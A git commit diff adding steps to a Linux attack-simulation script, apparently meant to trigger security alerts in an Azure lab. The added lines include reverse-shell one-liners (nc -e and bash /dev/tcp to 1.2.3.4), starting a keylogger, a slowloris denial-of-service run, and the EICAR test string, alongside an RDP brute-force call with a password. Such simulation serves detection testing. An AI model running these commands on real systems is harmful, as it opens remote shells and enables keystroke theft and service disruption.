1c2635dab71b620caef64efabb68dbdba08b4244
Tomas Kubica <tkubica12@gmail.com>
2020-12-01 08:17:02 +0100

    Linux attack simulation script

--- scripts/infraAttackSimulationFromLinux.sh
+++ scripts/infraAttackSimulationFromLinux.sh
@@ -15,3 +15,18 @@ pip3 install -r requirements.txt
 
 # Get in to simulate success
 ./crowbar.py -b rdp -u tomas -c Azure12345678 -s 10.0.0.4/32 -v -D -n 1
+
+# Attempt to create revese shell
+nc -e /bin/bash 1.2.3.4 1234 || true 
+bash -i>& /dev/tcp/1.2.3.4/1234 0>&1 || true
+
+# Add and remove kernel module
+# sudo insmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
+# sudo rmmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
+
+# Store malware file
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./EICAR.com
+
+# Run questionable tools
+logkeys --start || true
+perl slowloris.pl -dns server.contoso.com || true
